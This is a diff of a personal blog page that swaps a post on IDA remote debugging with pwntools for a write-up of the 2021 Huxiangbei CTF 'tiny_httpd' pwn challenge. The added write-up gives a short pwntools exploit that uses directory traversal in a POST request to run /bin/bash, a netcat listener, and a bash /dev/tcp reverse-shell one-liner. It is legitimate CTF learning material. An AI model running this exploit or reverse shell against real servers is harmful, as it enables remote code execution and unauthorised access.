@@ -20,30 +20,27 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="ida动态调试+pwntools输入">
+  <meta name="description" content="2021湖湘杯pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ida动态调试+pwntools输入">
-<meta property="og:url" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/index.html">
+<meta property="og:title" content="2021湖湘杯线上">
+<meta property="og:url" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/index.html">
 <meta property="og:site_name" content="ABf1ag&#39;s blog">
-<meta property="og:description" content="ida动态调试+pwntools输入">
+<meta property="og:description" content="2021湖湘杯pwn">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170431707.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101165937408.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170102888.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170351244.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170929794.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171050294.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171241305.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172157875.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172341129.png">
-<meta property="og:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172858732.png">
-<meta property="article:published_time" content="2021-11-01T08:32:46.000Z">
-<meta property="article:modified_time" content="2021-11-01T09:32:04.745Z">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116215036500.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116215345606.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116215712832.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116220903194.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116224122030.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116221920622.png">
+<meta property="og:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116222231479.png">
+<meta property="article:published_time" content="2021-11-16T13:34:28.000Z">
+<meta property="article:modified_time" content="2021-11-16T14:41:31.265Z">
 <meta property="article:author" content="ABf1ag">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170431707.png">
+<meta name="twitter:image" content="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog/source_posts/2021湖湘杯线上/image-20211116215036500.png">
 
-<link rel="canonical" href="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/">
+<link rel="canonical" href="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/">
 
 
 <script id="page-configurations">
@@ -56,7 +53,7 @@
   };
 </script>
 
-  <title>ida动态调试+pwntools输入 | ABf1ag's blog</title>
+  <title>2021湖湘杯线上 | ABf1ag's blog</title>
   
 
 
@@ -166,7 +163,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -179,7 +176,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          ida动态调试+pwntools输入
+          2021湖湘杯线上
         </h1>
 
         <div class="post-meta">
@@ -190,7 +187,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-11-01 16:32:46 / Modified: 17:32:04" itemprop="dateCreated datePublished" datetime="2021-11-01T16:32:46+08:00">2021-11-01</time>
+              <time title="Created: 2021-11-16 21:34:28 / Modified: 22:41:31" itemprop="dateCreated datePublished" datetime="2021-11-16T21:34:28+08:00">2021-11-16</time>
             </span>
 
           
@@ -204,39 +201,35 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="ida动态调试-pwntools输入"><a href="#ida动态调试-pwntools输入" class="headerlink" title="ida动态调试+pwntools输入"></a>ida动态调试+pwntools输入</h3><span id="more"></span>
+        <h3 id="2021湖湘杯pwn"><a href="#2021湖湘杯pwn" class="headerlink" title="2021湖湘杯pwn"></a>2021湖湘杯pwn</h3><span id="more"></span>
 
-<p>因为网上没有太多关于这方面的博客并且也都有些简单了(<del>对于我这种人来说并不算太友好</del>)，所以本篇记录了我一些踩坑的地方，同时也会写的尽量详细一点。</p>
-<h3 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h3><p>首先在找到dbgsrv文件夹，将其中的linux_server/64放入到linux中。在linux中查看linux_serve/64有无执行权限，如果没有使用如下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 ./linux_serve/64</span><br></pre></td></tr></table></figure>
+<h3 id="1-tiny-httpd"><a href="#1-tiny-httpd" class="headerlink" title="1.tiny_httpd"></a>1.tiny_httpd</h3><p>这个题直接给出了源码，分析源码可以发现他会将两个连续的’.’变成一个，并且path是我们可以控制的，这就造成了漏洞。</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116215036500.png" alt="image-20211116215036500"></p>
+<p>路径确定后如果cgi=1那么就会执行文件，如果为0就会查看文件。</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116215345606.png" alt="image-20211116215345606"></p>
+<p>一开始的思路就是利用目录穿越直接查看flag，结果发现seeve_file的file路径被写死。</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116215712832.png" alt="image-20211116215712832"></p>
+<p>所以得利用目录穿越执行/bin/bash,要使其可执行，就必须是cgi=1。要使cgi=1有两种方法，第一种是利用POST请求，第二种方法是利用GET请求但需要加？+参数，但由于并不知道参数名，所以我们只能使用POST的传参。</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116220903194.png" alt="image-20211116220903194"></p>
+<p>使用POST的传参是需要注意，一定要在后面添加content-length。</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,9990)</span><br><span class="line"></span><br><span class="line">payload=&#x27;POST /.../.../.../.../.../.../.../.../.../bin/bash\r\nContent-length: 100\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>在linux上执行./linux_serve/64,如下图</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170431707.png" alt="image-20211101170431707"></p>
-<p>接着我们打开ida，在菜单栏找到debugger</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101165937408.png" alt="image-20211101165937408"></p>
-<p>我们选择<code>Remote linux debugger</code></p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170102888.png" alt="image-20211101170102888"></p>
-<p>紧接着我们<strong>在程序中下上断点</strong>。</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170351244.png" alt="image-20211101170351244"></p>
-<p>然后点击debugger中的Start process，会跳出来如下弹窗</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170929794.png" alt="image-20211101170929794"></p>
-<p>然后就会运行到断点处：</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171050294.png" alt="image-20211101171050294"></p>
-<p><strong>如果断点下在输入函数后，需要我们先进行输入，才能到达断点处。</strong></p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171241305.png" alt="image-20211101171241305"></p>
-<p>但我们有时候需要输入不可显示字符才能使程序继续下去，所以我们需要使用pwntools来输入不可显示字符。</p>
-<h3 id="pwntools输入"><a href="#pwntools输入" class="headerlink" title="pwntools输入"></a>pwntools输入</h3><p>我们需要首先在linux中安装socat、expect、pwntools，使用apt-get即可安装。</p>
-<p>接着创建一个idaIOtool.sh，将如下代码复制到文件中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/expect -f</span><br><span class="line">spawn socat tcp-listen:10001,reuseaddr,fork EXEC:./CrazyVM,pty,raw,echo=0</span><br><span class="line">spawn python2</span><br><span class="line">send &quot;from pwn import *\n&quot;</span><br><span class="line">send &quot;io=remote(&#x27;127.0.0.1&#x27;,10001)\n&quot;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure>
+<p>但因为程序使用了<code>dup2(cgi_output[1],STDOUT);dup2(cgi_input[0],STDIN);</code>将输入输出重定向了，所以我们并不能得到回显，因此需要我们反弹shell。</p>
+<p>我们先监听要反弹shell的端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vnlp port</span><br></pre></td></tr></table></figure>
 
-<p><strong>代码中 <code>./CrazyVM</code> 需要替换成自己的程序名</strong>。 </p>
-<p>运行linux_server64</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172157875.png" alt="image-20211101172157875"></p>
-<p>运行idaIOtool.sh</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172341129.png" alt="image-20211101172341129"></p>
-<p>打开ida在debugger中找到Attach to process，找到运行的程序。点击ok即可调试。</p>
-<p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172858732.png" alt="image-20211101172858732"></p>
-<p>这样我们就可以使用pwntools输入不可显示字符了。</p>
+<p>在交互下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>就可以拿到新的shell了。</p>
+<p>关于这个重定向，我找到了写出这个[web服务的作者]( <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019820410">C - C语言实现最简单的HTTP服务器 - SegmentFault 思否</a> ),它里面给出了一张图，很直观。</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116224122030.png" alt="image-20211116224122030"></p>
+<p><strong>小插曲</strong>：在看到这个反弹shell的命令时，我问了问fmyyy👴他的原理是啥，他紧接着发了个命令给我</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116221920622.png" alt="image-20211116221920622"></p>
+<p>然后我就天真的执行了（emmmmmmmmmm）</p>
+<p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/ABf1ag-blog\source_posts\2021湖湘杯线上\image-20211116222231479.png" alt="image-20211116222231479"></p>
+<p>好家伙，直接言传身教，学到了，学到了。</p>
 
     </div>
 
@@ -252,12 +245,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" rel="prev" title="东华杯">
-      <i class="fa fa-chevron-left"></i> 东华杯
+    <a href="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/" rel="prev" title="ida动态调试+pwntools输入">
+      <i class="fa fa-chevron-left"></i> ida动态调试+pwntools输入
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/" rel="next" title="2021湖湘杯线上">
-      2021湖湘杯线上 <i class="fa fa-chevron-right"></i>
+    <a href="/2099/06/11/%E6%97%A5%E5%BF%97/" rel="next" title="日志">
+      日志 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -317,7 +310,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">ida动态调试+pwntools输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ida%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">ida远程调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E8%BE%93%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">pwntools输入</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#2021%E6%B9%96%E6%B9%98%E6%9D%AFpwn"><span class="nav-number">1.</span> <span class="nav-text">2021湖湘杯pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-tiny-httpd"><span class="nav-number">2.</span> <span class="nav-text">1.tiny_httpd</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
